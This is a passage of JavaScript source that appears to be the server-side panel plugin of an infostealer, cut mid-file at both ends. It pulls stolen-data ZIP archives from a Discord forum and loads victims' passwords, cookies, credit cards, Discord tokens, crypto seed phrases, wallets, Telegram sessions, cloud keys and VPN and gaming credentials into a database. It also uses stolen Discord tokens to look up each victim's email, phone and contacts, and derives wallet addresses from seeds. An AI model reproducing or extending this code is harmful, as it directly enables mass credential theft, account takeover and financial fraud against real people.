  scheduleDiscordFinalize(clientId);
}

// ── ZIP read + import (bot poll path) ─────────────────────────────────

function unzipAll(buf) {
  const out = [];
  const b = Buffer.isBuffer(buf) ? buf : Buffer.from(buf);
  let i = 0;
  while (i + 30 <= b.length) {
    const sig = b.readUInt32LE(i);
    if (sig !== 0x04034b50) break;
    const method = b.readUInt16LE(i + 8);
    const compSize = b.readUInt32LE(i + 18);
    const uncompSize = b.readUInt32LE(i + 22);
    const nameLen = b.readUInt16LE(i + 26);
    const extraLen = b.readUInt16LE(i + 28);
    const name = b.slice(i + 30, i + 30 + nameLen).toString("utf8");
    const dataStart = i + 30 + nameLen + extraLen;
    const comp = b.slice(dataStart, dataStart + compSize);
    let data;
    if (method === 0) data = comp;
    else if (method === 8) {
      try { data = inflateRawSync(comp); }
      catch (_) { data = null; }
    } else data = null;
    if (data) out.push({ name, data });
    i = dataStart + compSize;
    if (uncompSize === 0xffffffff || compSize === 0xffffffff) break; // zip64 not supported
  }
  return out;
}

function parseNetscapeCookies(text) {
  const rows = [];
  for (const line of String(text).split(/\r?\n/)) {
    if (!line || line.startsWith("#")) continue;
    const parts = line.split("\t");
    if (parts.length < 7) continue;
    const [host, , path, secure, expires, name, value] = parts;
    let expiresUtc = 0;
    const exp = Number(expires) || 0;
    if (exp > 0) expiresUtc = (exp + 11644473600) * 1000000;
    rows.push({
      host, path, name, value,
      secure: String(secure).toUpperCase() === "TRUE",
      httpOnly: false,
      expiresUtc,
      browser: "", profile: "",
    });
  }
  return rows;
}

function baseName(path) {
  const n = path.replace(/\\/g, "/").split("/").pop() || path;
  return n.toLowerCase();
}

function importZipIntoDb(db, zipBuf, fallbackClientId) {
  if (!stmts) throw new Error("statements not ready");
  const entries = unzipAll(zipBuf);
  if (!entries.length) throw new Error("empty or unsupported zip");

  let clientId = fallbackClientId || null;
  const buckets = emptyExportData();

  for (const ent of entries) {
    const bn = baseName(ent.name);
    const text = ent.data.toString("utf8");
    if (bn === "meta.json") {
      try {
        const meta = JSON.parse(text);
        if (meta.clientId) clientId = String(meta.clientId);
      } catch (_) {}
      continue;
    }
    if (bn === "cookies.txt") {
      buckets.cookies = parseNetscapeCookies(text);
      continue;
    }
    if (!bn.endsWith(".json")) continue;
    const key = bn.replace(/\.json$/, "");
    if (!buckets[key] && key !== "discord_profiles" && !EXPORT_FILE_ORDER.includes(key)) continue;
    try {
      const rows = JSON.parse(text);
      if (Array.isArray(rows)) {
        if (buckets[key]) buckets[key] = rows;
        else buckets[key] = rows;
      }
    } catch (_) {}
  }

  // Infer clientId from rows if meta missing
  if (!clientId) {
    for (const k of EXPORT_FILE_ORDER) {
      const row = (buckets[k] || [])[0];
      if (row?.clientId) { clientId = String(row.clientId); break; }
    }
  }
  if (!clientId) clientId = "discord-import";

  const now = Date.now();
  const payload = {
    passwords: buckets.passwords,
    cookies: buckets.cookies.map(r => ({
      host: r.host, name: r.name, value: r.value, path: r.path,
      secure: r.secure, httpOnly: r.httpOnly, expiresUtc: r.expiresUtc,
      browser: r.browser, profile: r.profile,
    })),
    autofill: buckets.autofill,
    history: buckets.history.map(r => ({
      url: r.url, title: r.title, visitTimeUnix: r.visitTimeUnix ?? r.visit_time_unix,
      browser: r.browser, profile: r.profile,
    })),
    bookmarks: buckets.bookmarks,
    creditCards: buckets.credit_cards.map(r => ({
      nameOnCard: r.nameOnCard ?? r.name_on_card,
      cardNumber: r.cardNumber ?? r.card_number,
      expirationMonth: r.expirationMonth ?? r.expiration_month,
      expirationYear: r.expirationYear ?? r.expiration_year,
      nickname: r.nickname, browser: r.browser, profile: r.profile,
    })),
    discordTokens: buckets.discord_tokens.map(r => ({ token: r.token, source: r.source })),
    files: buckets.files.map(r => ({
      dir: r.dir, name: r.name, ext: r.ext, size: r.size, modified: r.modified,
      path: r.path, tags: typeof r.tags === "string" ? r.tags.split(",").filter(Boolean) : (r.tags || []),
    })),
    extensions: buckets.extensions.map(r => ({
      extId: r.extId ?? r.ext_id, name: r.name, version: r.version,
      browser: r.browser, profile: r.profile, path: r.path, category: r.category,
    })),
    wallets: buckets.wallets,
    telegram: buckets.telegram,
    keys: buckets.keys,
    seeds: buckets.seeds,
    appCredentials: buckets.app_credentials.map(r => ({
      application: r.application, host: r.host, port: r.port,
      username: r.username, password: r.password, protocol: r.protocol, extra: r.extra,
    })),
  };

  const tx = db.transaction(() => {
    insertPayload(db, stmts, clientId, payload, now);
    // gaming / vpn rows from flat export
    for (const r of buckets.gaming_items || []) {
      stmts.insGaming.run(clientId, r.platform, r.label, r.value, r.detail || "", now);
    }
    for (const r of buckets.vpn_items || []) {
      stmts.insVpn.run(clientId, r.provider, r.label, r.value, r.detail || "", now);
    }
    for (const r of buckets.seeds || []) {
      if (!r.phrase) continue;
      const words = String(r.phrase).split(/\s+/);
      let valid = r.valid ? 1 : 0;
      let addresses = typeof r.addresses === "string" ? r.addresses : (r.addresses ? JSON.stringify(r.addresses) : null);
      if (!valid && words.every(w => wordlist.includes(w))) {
        valid = 1;
        try {
          addresses = JSON.stringify([
            ...deriveEthAddresses(r.phrase, 2).map(a => ({ chain: "EVM", address: a })),
            ...deriveBtcAddresses(r.phrase, 1).map(a => ({ chain: "BTC", address: a })),
            ...deriveLtcAddresses(r.phrase, 1).map(a => ({ chain: "LTC", address: a })),
            ...deriveTrxAddresses(r.phrase, 1).map(a => ({ chain: "TRX", address: a })),
          ]);
        } catch (_) {}
      }
      stmts.insSeed.run(clientId, r.source || "import", r.path || null, r.phrase, r.words || words.length, valid, addresses, now);
    }
    stmts.upsertRun.run(clientId, now);
  });
  tx();

  const counts = {};
  for (const k of EXPORT_FILE_ORDER) if (buckets[k]?.length) counts[k] = buckets[k].length;
  return { clientId, counts };
}

// ── Discord bot poller ────────────────────────────────────────────────

async function discordBotFetch(path, { method = "GET", raw = false } = {}) {
  const token = pluginSettings.discord_bot_token;
  if (!token) throw new Error("bot token not set");
  const res = await fetch(`https://discord.com/api/v10${path}`, {
    method,
    headers: {
      Authorization: `Bot ${token.trim()}`,
      "User-Agent": "StuartPlugin (overlord, 1.0)",
    },
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`Discord API ${res.status} ${path}: ${text.slice(0, 300)}`);
  }
  if (raw) return Buffer.from(await res.arrayBuffer());
  if (res.status === 204) return null;
  return res.json();
}

async function listForumThreadIds(channelId) {
  const ids = new Set();
  // Active threads for guild
  try {
    const ch = await discordBotFetch(`/channels/${channelId}`);
    const guildId = ch?.guild_id;
    if (guildId) {
      const active = await discordBotFetch(`/guilds/${guildId}/threads/active`);
      for (const t of active?.threads || []) {
        if (String(t.parent_id) === String(channelId)) ids.add(t.id);
      }
    }
  } catch (e) {
    console.warn("[stuart] active threads:", e.message);
  }
  // Public archived forum posts
  try {
    let before = "";
    for (let page = 0; page < 5; page++) {
      const q = before
        ? `/channels/${channelId}/threads/archived/public?limit=50&before=${before}`
        : `/channels/${channelId}/threads/archived/public?limit=50`;
      const arch = await discordBotFetch(q);
      const threads = arch?.threads || [];
      for (const t of threads) ids.add(t.id);
      if (!arch?.has_more || !threads.length) break;
      before = threads[threads.length - 1]?.id;
      if (!before) break;
    }
  } catch (e) {
    console.warn("[stuart] archived threads:", e.message);
  }
  return [...ids];
}

async function pollDiscordOnce() {
  if (discordPollRunning) return { ok: false, skipped: true, reason: "poll already running" };
  if (!isDiscordPollConfigured()) {
    return { ok: false, skipped: true, reason: "bot token or forum channel id missing" };
  }
  if (!pluginCtx?.db || !stmts) {
    return { ok: false, skipped: true, reason: "plugin not ready" };
  }

  discordPollRunning = true;
  let imported = 0;
  const errors = [];
  try {
    const channelId = pluginSettings.discord_forum_channel_id;
    const threadIds = await listForumThreadIds(channelId);
    const db = pluginCtx.db;
    const seenStmt = db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`);
    const insImport = db.prepare(
      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
    );

    for (const threadId of threadIds) {
      let messages;
      try {
        messages = await discordBotFetch(`/channels/${threadId}/messages?limit=50`);
      } catch (e) {
        errors.push(`thread ${threadId}: ${e.message}`);
        continue;
      }
      for (const msg of messages || []) {
        for (const att of msg.attachments || []) {
          const name = (att.filename || "").toLowerCase();
          if (!name.endsWith(".zip")) continue;
          if (!name.includes("stuart") && !name.includes("kematian")) continue;
          if (seenStmt.get(att.id)) continue;
          try {
            // Prefer proxy_url / url with bot auth when needed
            const url = att.url || att.proxy_url;
            const res = await fetch(url, {
              headers: { Authorization: `Bot ${pluginSettings.discord_bot_token.trim()}` },
            });
            if (!res.ok) throw new Error(`download ${res.status}`);
            const zipBuf = Buffer.from(await res.arrayBuffer());
            const result = importZipIntoDb(db, zipBuf, null);
            insImport.run(att.id, msg.id, threadId, result.clientId, att.filename || name, Date.now());
            imported++;
            console.log(`[stuart] imported Discord zip ${att.filename} → client ${result.clientId}`);
            try {
              pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
            } catch (_) {}
          } catch (e) {
            errors.push(`${att.filename}: ${e.message}`);
            console.error("[stuart] import attachment failed:", e.message);
          }
        }
      }
    }

    discordPollStatus = {
      lastAt: Date.now(),
      lastOk: errors.length === 0,
      lastError: errors.slice(0, 3).join("; "),
      imported,
      message: `threads=${threadIds.length} imported=${imported}`,
    };
    return { ok: true, threads: threadIds.length, imported, errors };
  } catch (e) {
    discordPollStatus = {
      lastAt: Date.now(),
      lastOk: false,
      lastError: e.message,
      imported,
      message: "poll failed",
    };
    return { ok: false, error: e.message, imported };
  } finally {
    discordPollRunning = false;
  }
}

/** No interval poller — import happens for each webhook upload only; manual poll is optional recovery. */

function runPurge(db) {
  let total = 0;
  if (pluginSettings.history_limit > 0) {
    const clients = db.prepare(`SELECT client_id FROM history GROUP BY client_id HAVING COUNT(*) > ?`).all(pluginSettings.history_limit);
    for (const c of clients) {
      const r = db.prepare(`DELETE FROM history WHERE client_id = ? AND id NOT IN (SELECT id FROM history WHERE client_id = ? ORDER BY visit_time_unix DESC LIMIT ?)`).run(c.client_id, c.client_id, pluginSettings.history_limit);
      total += r.changes;
    }
  }
  if (pluginSettings.cookie_max_age_days > 0) {
    const cutoff = Date.now() - (pluginSettings.cookie_max_age_days * 86400000);
    const r = db.prepare(`DELETE FROM cookies WHERE captured_at < ?`).run(cutoff);
    total += r.changes;
  }
  return total;
}

const BALANCE_CHAINS = [
  { name: "ETH",      rpc: "https://rpc.ankr.com/eth" },
  { name: "BSC",      rpc: "https://rpc.ankr.com/bsc" },
  { name: "Polygon",  rpc: "https://rpc.ankr.com/polygon" },
  { name: "Arbitrum", rpc: "https://rpc.ankr.com/arbitrum" },
  { name: "Optimism", rpc: "https://rpc.ankr.com/optimism" },
  { name: "Avalanche",rpc: "https://rpc.ankr.com/avalanche" },
  { name: "Base",     rpc: "https://rpc.ankr.com/base" },
];

async function enrichDiscordToken(ctx, clientId, token) {
  const now = Date.now();
  const h = {
    Authorization: token,
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  };
  try {
    const [meRes, guildsRes, relsRes] = await Promise.all([
      fetch('https://discord.com/api/v10/users/@me', { headers: h }),
      fetch('https://discord.com/api/v10/users/@me/guilds', { headers: h }),
      fetch('https://discord.com/api/v10/users/@me/relationships', { headers: h }),
    ]);
    const me = await meRes.json();
    if (!meRes.ok) {
      ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(client_id,token,error,enriched_at) VALUES(?,?,?,?)`)
        .run(clientId, token, me.message || `HTTP ${meRes.status}`, now);
      return;
    }
    const guilds  = guildsRes.ok ? await guildsRes.json() : [];
    const rels    = relsRes.ok  ? await relsRes.json()   : [];
    const friends = Array.isArray(rels) ? rels.filter(r => r.type === 1).length : 0;
    const gNames  = Array.isArray(guilds) ? guilds.slice(0, 30).map(g => g.name).join('|') : '';
    ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(
      client_id,token,user_id,username,discriminator,global_name,avatar,email,phone,
      verified,mfa_enabled,premium_type,flags,public_flags,locale,
      friends_count,guilds_count,guild_names,enriched_at,error
    ) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,NULL)`)
    .run(
      clientId, token, me.id, me.username, me.discriminator || '0',
      me.global_name || null, me.avatar || null, me.email || null, me.phone || null,
      me.verified ? 1 : 0, me.mfa_enabled ? 1 : 0, me.premium_type || 0,
      me.flags || 0, me.public_flags || 0, me.locale || null,
      friends, Array.isArray(guilds) ? guilds.length : 0, gNames || null, now,
    );
  } catch (e) {
    ctx.db.prepare(`INSERT OR REPLACE INTO discord_profiles(client_id,token,error,enriched_at) VALUES(?,?,?,?)`)
      .run(clientId, token, e.message, now);
  }
}

function needsEnrichment(ctx, token) {
  const row = ctx.db.prepare(`SELECT enriched_at FROM discord_profiles WHERE token = ?`).get(token);
  return !row || !row.enriched_at;
}

function extractVaultAccounts(vaultData) {
  const accounts = [];
  try {
    const keyrings = Array.isArray(vaultData) ? vaultData : [vaultData];
    for (const kr of keyrings) {
      if (kr.type === 'HD Key Tree' && Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: 'HD', address: addr });
      } else if (kr.type === 'Simple Key Pair' && Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: 'Imported', address: addr });
      } else if (Array.isArray(kr.accounts)) {
        for (const addr of kr.accounts) accounts.push({ type: kr.type || 'Unknown', address: addr });
      }
      if (kr.mnemonic) accounts.push({ type: 'Mnemonic', mnemonic: kr.mnemonic });
    }
  } catch (_) {}
  return accounts;
}

function prepareStatements(db) {
  return {
    insPw:     db.prepare(`INSERT OR REPLACE INTO passwords(client_id,url,username,password,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insCk:     db.prepare(`INSERT OR REPLACE INTO cookies(client_id,host,name,value,path,secure,http_only,expires_utc,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?,?,?,?,?)`),
    insAf:     db.prepare(`INSERT OR IGNORE INTO autofill(client_id,name,value,browser,profile,captured_at) VALUES(?,?,?,?,?,?)`),
    insHi:     db.prepare(`INSERT OR IGNORE INTO history(client_id,url,title,visit_time_unix,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insBk:     db.prepare(`INSERT OR REPLACE INTO bookmarks(client_id,name,url,type,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insCc:     db.prepare(`INSERT OR REPLACE INTO credit_cards(client_id,name_on_card,card_number,expiration_month,expiration_year,nickname,browser,profile,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insDt:     db.prepare(`INSERT OR IGNORE INTO discord_tokens(client_id,token,source,captured_at) VALUES(?,?,?,?)`),
    insFi:     db.prepare(`INSERT OR REPLACE INTO files(client_id,dir,name,ext,size,modified,path,tags,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insEx:     db.prepare(`INSERT OR REPLACE INTO extensions(client_id,ext_id,name,version,browser,profile,path,category,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insWl:     db.prepare(`INSERT OR REPLACE INTO wallets(client_id,name,type,path,files,size,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insTg:     db.prepare(`INSERT OR REPLACE INTO telegram_sessions(client_id,account,path,files,size,captured_at) VALUES(?,?,?,?,?,?)`),
    insKey:    db.prepare(`INSERT OR REPLACE INTO cloud_keys(client_id,type,name,path,size,content,captured_at) VALUES(?,?,?,?,?,?,?)`),
    insSeed:   db.prepare(`INSERT OR REPLACE INTO seeds(client_id,source,path,phrase,words,valid,addresses,captured_at) VALUES(?,?,?,?,?,?,?,?)`),
    insApp:    db.prepare(`INSERT OR REPLACE INTO app_credentials(client_id,application,host,port,username,password,protocol,extra,captured_at) VALUES(?,?,?,?,?,?,?,?,?)`),
    insGaming: db.prepare(`INSERT OR REPLACE INTO gaming_items(client_id,platform,label,value,detail,captured_at) VALUES(?,?,?,?,?,?)`),
    insVpn:    db.prepare(`INSERT OR REPLACE INTO vpn_items(client_id,provider,label,value,detail,captured_at) VALUES(?,?,?,?,?,?)`),
    upsertRun: db.prepare(`INSERT OR REPLACE INTO client_runs(client_id,last_captured_at) VALUES(?,?)`),
  };
}

function clearClient(db, clientId) {
  deleteClientBlobs(clientId);
  for (const tbl of ["passwords","cookies","autofill","history","bookmarks","credit_cards","discord_tokens","discord_profiles","files","extensions","wallets","wallet_data","telegram_sessions","cloud_keys","seeds","app_credentials","gaming_items","vpn_items"])
    db.prepare(`DELETE FROM ${tbl} WHERE client_id=?`).run(clientId);
}

function insertPayload(db, s, clientId, payload, now) {
  for (const r of payload.passwords || [])
    s.insPw.run(clientId, r.url, r.username, r.password, r.browser, r.profile, now);
  if (pluginSettings.capture_cookies)
    for (const r of payload.cookies || [])
      s.insCk.run(clientId, r.host, r.name, r.value, r.path, r.secure ? 1 : 0, r.httpOnly ? 1 : 0, r.expiresUtc, r.browser, r.profile, now);
  for (const r of payload.autofill || [])
    s.insAf.run(clientId, r.name, r.value, r.browser, r.profile, now);
  if (pluginSettings.capture_history)
    for (const r of payload.history || [])
      s.insHi.run(clientId, r.url, r.title, r.visitTimeUnix, r.browser, r.profile, now);
  for (const r of payload.bookmarks || [])
    s.insBk.run(clientId, r.name, r.url, r.type, r.browser, r.profile, now);
  for (const r of payload.creditCards || [])
    s.insCc.run(clientId, r.nameOnCard, r.cardNumber, r.expirationMonth, r.expirationYear, r.nickname, r.browser, r.profile, now);
  for (const r of payload.discordTokens || [])
    s.insDt.run(clientId, r.token, r.source, now);
  for (const r of payload.files || [])
    s.insFi.run(clientId, r.dir, r.name, r.ext, r.size, r.modified, r.path, (r.tags || []).join(",") || null, now);
  for (const r of payload.extensions || [])
    s.insEx.run(clientId, r.extId, r.name, r.version, r.browser, r.profile, r.path, r.category || null, now);
  for (const r of payload.wallets || [])
    s.insWl.run(clientId, r.name, r.type || null, r.path, r.files, r.size, now);
  for (const r of payload.telegram || [])
    s.insTg.run(clientId, r.account, r.path, r.files, r.size, now);
  for (const r of payload.keys || [])
    s.insKey.run(clientId, r.type, r.name, r.path, r.size, r.content || null, now);
  for (const r of payload.appCredentials || [])
    s.insApp.run(clientId, r.application, r.host || null, r.port || 0, r.username || null, r.password || null, r.protocol || null, r.extra || null, now);
  if (payload.gaming) {
    const g = payload.gaming;
    if (g.steam) {
      const st = g.steam;
      if (st.account) s.insGaming.run(clientId, "Steam", "Account", st.account, st.rememberPw ? "Remember PW" : "", now);
      if (st.token) s.insGaming.run(clientId, "Steam", "Token", st.token, "", now);
      if (st.steamPath) s.insGaming.run(clientId, "Steam", "Path", st.steamPath, "", now);
      for (const f of (st.ssfnFiles || [])) s.insGaming.run(clientId, "Steam", "SSFN", f, "", now);
      for (const gm of (st.games || [])) s.insGaming.run(clientId, "Steam", gm.name, gm.id, gm.installed ? "Installed" : "", now);
    }
    for (const b of (g.battleNet || [])) s.insGaming.run(clientId, "Battle.net", b.name, b.path, "", now);
    for (const e of (g.epic || [])) s.insGaming.run(clientId, "Epic", e.name, e.path, "", now);
    for (const r of (g.riot || [])) s.insGaming.run(clientId, "Riot", r.name, r.path, "", now);
    for (const u of (g.uplay || [])) s.insGaming.run(clientId, "Uplay", u.name, u.path, "", now);
  }
  if (payload.vpns) {
    const v = payload.vpns;
    for (const n of (v.nordvpn || [])) s.insVpn.run(clientId, "NordVPN", n.username, n.password, n.version, now);
    for (const w of (v.wireguard || [])) s.insVpn.run(clientId, "WireGuard", w.name, w.endpoint || "", w.interface || "", now);
    for (const o of (v.openvpn || [])) s.insVpn.run(clientId, "OpenVPN", o.name, o.path, "", now);
    for (const m of (v.mullvad || [])) s.insVpn.run(clientId, "Mullvad", m.accountNumber, m.settingsPath, "", now);
  }
}

const TABLE_CFGS = {
  passwords: {
    tbl: 'passwords',
    sel: 'client_id as clientId,url,username,password,browser,profile',
    searchOn: ['url', 'username'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  cookies: {
    tbl: 'cookies',
    sel: 'client_id as clientId,host,name,value,path,secure,http_only as httpOnly,expires_utc as expiresUtc,browser,profile',
    searchOn: ['host', 'name'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  autofill: {
    tbl: 'autofill',
    sel: 'client_id as clientId,name,value,browser,profile',
    searchOn: ['name', 'value'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  history: {
    tbl: 'history',
    sel: 'client_id as clientId,url,title,visit_time_unix as visitTimeUnix,browser,profile',
    searchOn: ['url', 'title'],
    order: 'visit_time_unix DESC',
    hasBrowser: true,
  },
  bookmarks: {
    tbl: 'bookmarks',
    sel: 'client_id as clientId,name,url,type,browser,profile',
    searchOn: ['name', 'url'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  credit_cards: {
    tbl: 'credit_cards',
    sel: 'client_id as clientId,name_on_card as nameOnCard,card_number as cardNumber,expiration_month as expirationMonth,expiration_year as expirationYear,nickname,browser,profile',
    searchOn: ['name_on_card', 'nickname'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  discord_tokens: {
    tbl: 'discord_tokens',
    sel: 'client_id as clientId,token,source',
    searchOn: ['token', 'source'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  files: {
    tbl: 'files',
    sel: 'client_id as clientId,dir,name,ext,size,modified,path,tags',
    searchOn: ['dir', 'name', 'path'],
    order: 'modified DESC',
    hasBrowser: false,
  },
  extensions: {
    tbl: 'extensions',
    sel: 'client_id as clientId,ext_id as extId,name,version,browser,profile,path,category',
    searchOn: ['name', 'ext_id'],
    order: 'captured_at DESC',
    hasBrowser: true,
  },
  wallets: {
    tbl: 'wallets',
    sel: 'client_id as clientId,name,type,path,files,size',
    searchOn: ['name', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  telegram: {
    tbl: 'telegram_sessions',
    sel: 'client_id as clientId,account,path,files,size,(content IS NOT NULL OR blob_path IS NOT NULL) as hasContent',
    searchOn: ['account', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  keys: {
    tbl: 'cloud_keys',
    sel: 'client_id as clientId,type,name,path,size,content',
    searchOn: ['type', 'name', 'path'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  seeds: {
    tbl: 'seeds',
    sel: 'client_id as clientId,source,path,phrase,words,valid,addresses',
    searchOn: ['source', 'path', 'phrase'],
    order: 'valid DESC, captured_at DESC',
    hasBrowser: false,
  },
  app_credentials: {
    tbl: 'app_credentials',
    sel: 'client_id as clientId,application,host,port,username,password,protocol,extra',
    searchOn: ['application', 'host', 'username', 'protocol'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  gaming_items: {
    tbl: 'gaming_items',
    sel: 'client_id as clientId,platform,label,value,detail',
    searchOn: ['platform', 'label', 'value'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
  vpn_items: {
    tbl: 'vpn_items',
    sel: 'client_id as clientId,provider,label,value,detail',
    searchOn: ['provider', 'label', 'value'],
    order: 'captured_at DESC',
    hasBrowser: false,
  },
};

function listTable(ctx, cfg, params) {
  const limit   = Math.max(0, Number(params?.limit  ?? 1000));
  const offset  = Math.max(0, Number(params?.offset ?? 0));
  const search  = String(params?.search  || '').trim();
  const cid     = params?.clientId;
  const browser = cfg.hasBrowser ? String(params?.browser || '') : '';

  const wheres = [], args = [];
  if (cid)     { wheres.push('client_id = ?'); args.push(cid); }
  if (browser) { wheres.push('browser = ?');   args.push(browser); }
  if (search && cfg.searchOn.length) {
    wheres.push('(' + cfg.searchOn.map(c => `${c} LIKE ?`).join(' OR ') + ')');
    for (let i = 0; i < cfg.searchOn.length; i++) args.push(`%${search}%`);
  }

  const where = wheres.length ? ' WHERE ' + wheres.join(' AND ') : '';
  const total = ctx.db.prepare(`SELECT COUNT(*) as n FROM ${cfg.tbl}${where}`).get(...args).n;

  let q = `SELECT ${cfg.sel} FROM ${cfg.tbl}${where} ORDER BY ${cfg.order}`;
  if (limit > 0) q += ` LIMIT ${limit} OFFSET ${offset}`;

  return { rows: ctx.db.prepare(q).all(...args), total };
}

export default {
  setup(ctx) {
    ctx.db.exec(`PRAGMA journal_mode=WAL`);
    ctx.db.exec(`PRAGMA synchronous=NORMAL`);
    ctx.db.exec(`PRAGMA cache_size=-16000`);
    ctx.db.exec(`PRAGMA temp_store=MEMORY`);
    ctx.db.exec(`PRAGMA mmap_size=268435456`);
    ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS passwords (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        url TEXT, username TEXT, password TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS pw_client ON passwords(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS pw_dedup ON passwords(client_id, url, username, browser, profile);

      CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        host TEXT, name TEXT, value TEXT, path TEXT,
        secure INTEGER, http_only INTEGER, expires_utc INTEGER,
        browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ck_client ON cookies(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ck_dedup ON cookies(client_id, host, name, path, browser, profile);

      CREATE TABLE IF NOT EXISTS autofill (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, value TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS af_client ON autofill(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS af_dedup ON autofill(client_id, name, value, browser, profile);

      CREATE TABLE IF NOT EXISTS history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        url TEXT, title TEXT, visit_time_unix INTEGER,
        browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS hi_client ON history(client_id);
      CREATE INDEX IF NOT EXISTS hi_visit  ON history(visit_time_unix);
      CREATE UNIQUE INDEX IF NOT EXISTS hi_dedup ON history(client_id, url, visit_time_unix, browser, profile);

      CREATE TABLE IF NOT EXISTS bookmarks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, url TEXT, type TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS bk_client ON bookmarks(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS bk_dedup ON bookmarks(client_id, url, browser, profile);

      CREATE TABLE IF NOT EXISTS credit_cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name_on_card TEXT, card_number TEXT, expiration_month TEXT, expiration_year TEXT,
        nickname TEXT, browser TEXT, profile TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS cc_client ON credit_cards(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS cc_dedup ON credit_cards(client_id, card_number, name_on_card, browser, profile);

      CREATE TABLE IF NOT EXISTS discord_tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        token TEXT, source TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS dt_client ON discord_tokens(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS dt_dedup ON discord_tokens(client_id, token);

      CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        dir TEXT, name TEXT, ext TEXT, size INTEGER, modified INTEGER, path TEXT,
        tags TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS fi_client ON files(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS fi_dedup ON files(client_id, path);

      CREATE TABLE IF NOT EXISTS extensions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        ext_id TEXT, name TEXT, version TEXT, browser TEXT, profile TEXT, path TEXT,
        category TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS ex_client ON extensions(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS ex_dedup ON extensions(client_id, ext_id, browser, profile);

      CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT, type TEXT, path TEXT, files INTEGER, size INTEGER,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS wl_client ON wallets(client_id);
      CREATE UNIQUE INDEX IF NOT EXISTS wl_dedup ON wallets(client_id, name, path);

      CREATE TABLE IF NOT EXISTS discord_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        token TEXT NOT NULL UNIQUE,
        user_id TEXT, username TEXT, discriminator TEXT, global_name TEXT,
        avatar TEXT, email TEXT, phone TEXT,
        verified INTEGER, mfa_enabled INTEGER, premium_type INTEGER,
        flags INTEGER, public_flags INTEGER, locale TEXT,
        friends_count INTEGER, guilds_count INTEGER, guild_names TEXT,
        enriched_at INTEGER, error TEXT
      );
      CREATE INDEX IF NOT EXISTS dp_client ON discord_profiles(client_id);

      CREATE TABLE IF NOT EXISTS wallet_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        name TEXT NOT NULL,
